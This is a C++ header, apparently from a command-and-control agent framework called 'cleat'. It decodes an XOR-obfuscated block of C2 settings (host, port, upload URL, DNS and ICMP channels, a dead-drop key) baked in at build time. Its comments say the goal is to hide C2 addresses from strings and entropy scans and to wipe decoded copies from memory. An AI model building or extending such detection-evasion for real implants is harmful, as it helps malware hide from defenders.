/**
 * @file StaticObfConfig.hpp
 * @brief 编译期烧录配置的分片混淆块解码（敏感数据保护 Phase B1）
 * @details
 * 生成器把地址类字段(transport/host/port/url/upload_url/dns_server/dns_domain/
 * icmp_target)打包为一个 XOR 混淆块, 以十六进制字符串宏 CLEAT_DEFAULT_OBF 注入,
 * 使产物 .rdata 中不再出现明文 C2 地址(strings/熵扫描不再直接命中)。
 *
 * 块格式(与 TeamServer/服务端实现 的 obfEncode 锁步, 两处注释互指):
 *   [0..3]  魔数 "CSC1"(0x43 0x53 0x43 0x31)
 *   [4]     版本 1
 *   [5]     条目数 N
 *   条目:   [id 1B][len 2B 大端][bytes len]
 *   id:     1=transport 2=host 3=port 4=url 5=upload_url 6=dns_server
 *           7=dns_domain 8=icmp_target 9=dd_key
 *   整块逐字节 XOR kObfMask[i % 32] 后转小写 hex → 宏值
 *
 * 定位说明: XOR 只消除"直接可读", 不是加密(不防逆向); 强保护见
 * 不触碰嵌入式配置块(patch)/CLI/远程下发三条配置来源与其优先级。
 *
 * 落位说明: 归 **Core/Bootstrap/** —— 本机制是"生成期注入
 * 管线"的解码端(与 EmbeddedConfig 同批), 非运行时配置数据; 唯一消费点 =
 * AgentConfig 构造期(宏桥接注入 + dd_key)。
 */
#pragma once

#include <cstdint>
#include <string>

namespace cleat {

    /// 烧录配置解码结果(未定义 CLEAT_DEFAULT_OBF 或解码失败时 valid=false 且字段为空)
    struct StaticObfConfig {
        bool valid = false;
        std::string transport;
        std::string host;
        std::string port;         ///< 十进制字符串; 取值请用 Port()
        std::string url;
        std::string upload_url;
        std::string dns_server;
        std::string dns_domain;
        std::string icmp_target;
        /// 死投递主密钥: 生成器每构建随机生成 ≥32B,
        /// 消费点 = AgentConfig 构造期(取入 recovery_.key), 随解码缓存一并擦除。
        /// 未烧录时为空 → AgentContextRuntime 回落 CLEAT_DEFAULT_DD_KEY。
        std::string dd_key;

        /// 烧录端口; 空/非法/越界时返回 def(与内置默认一致)
        uint16_t Port(uint16_t def) const;
    };

    /// 解码烧录配置(首次调用解码并缓存, 线程安全)
    const StaticObfConfig& GetStaticObfConfig();

    /// Phase C: 擦除解码缓存(明文 C2 地址驻留副本)。
    /// 唯一消费方 = AgentConfig 构造期成员初始化, 完成后即可擦。
    /// 幂等; 擦除后再调用 GetStaticObfConfig() 返回空字段(valid=false)。
    void WipeDecodedStaticObfConfig();

    /// 解码值优先, 空则回落内置默认 —— 保证解码失败时行为与改动前完全一致。
    /// 返回值指向缓存结构或字面量, 生命周期安全(勿长期持有)。
    inline const char* ObfOr(const std::string& v, const char* def) {
        return v.empty() ? def : v.c_str();
    }

    /// 烧录端口字符串; 非法/缺失时返回 def(供 CLEAT_DEFAULT_PORT 桥接, 走 std::atoi)
    const char* ObfPortStr(const char* def);

} // namespace cleat

// ---------------------------------------------------------------------------
// 宏桥接: 烧录混淆块 → 既有编译期宏名
// ---------------------------------------------------------------------------
// AgentConfig.hpp 的连接字段初值一直写作 `#ifdef CLEAT_DEFAULT_HOST ... = CLEAT_DEFAULT_HOST`,
// 这里在定义了 CLEAT_DEFAULT_OBF 时把同名宏映射为"混淆块解码结果", 于是:
//   1) AgentConfig.hpp 零改造、无重复分支, 优先级语义完全不变;
//   2) 未定义 CLEAT_DEFAULT_OBF 的构建(dev/手编 cmake)行为与改动前逐字节一致;
//   3) 解码失败时 ObfOr/Port 回落内置默认, 不会把字段清空。
// 注意: 这些宏展开为表达式而非常量字面量, 只能用于赋值或函数实参位置。
#ifdef CLEAT_DEFAULT_OBF

#ifdef CLEAT_DEFAULT_TRANSPORT
#undef CLEAT_DEFAULT_TRANSPORT
#endif
#define CLEAT_DEFAULT_TRANSPORT cleat::ObfOr(cleat::GetStaticObfConfig().transport, "tcp")

#ifdef CLEAT_DEFAULT_HOST
#undef CLEAT_DEFAULT_HOST
#endif
#define CLEAT_DEFAULT_HOST cleat::ObfOr(cleat::GetStaticObfConfig().host, "127.0.0.1")

#ifdef CLEAT_DEFAULT_PORT
#undef CLEAT_DEFAULT_PORT
#endif
#define CLEAT_DEFAULT_PORT cleat::ObfPortStr("4444")

#ifdef CLEAT_DEFAULT_URL
#undef CLEAT_DEFAULT_URL
#endif
#define CLEAT_DEFAULT_URL cleat::ObfOr(cleat::GetStaticObfConfig().url, "")

#ifdef CLEAT_DEFAULT_UPLOAD_URL
#undef CLEAT_DEFAULT_UPLOAD_URL
#endif
#define CLEAT_DEFAULT_UPLOAD_URL cleat::ObfOr(cleat::GetStaticObfConfig().upload_url, "")

#ifdef CLEAT_DEFAULT_DNS_SERVER
#undef CLEAT_DEFAULT_DNS_SERVER
#endif
#define CLEAT_DEFAULT_DNS_SERVER cleat::ObfOr(cleat::GetStaticObfConfig().dns_server, "")

#ifdef CLEAT_DEFAULT_DNS_DOMAIN
#undef CLEAT_DEFAULT_DNS_DOMAIN
#endif
#define CLEAT_DEFAULT_DNS_DOMAIN cleat::ObfOr(cleat::GetStaticObfConfig().dns_domain, "")

#ifdef CLEAT_DEFAULT_ICMP_TARGET
#undef CLEAT_DEFAULT_ICMP_TARGET
#endif
#define CLEAT_DEFAULT_ICMP_TARGET cleat::ObfOr(cleat::GetStaticObfConfig().icmp_target, "")

#endif // CLEAT_DEFAULT_OBF
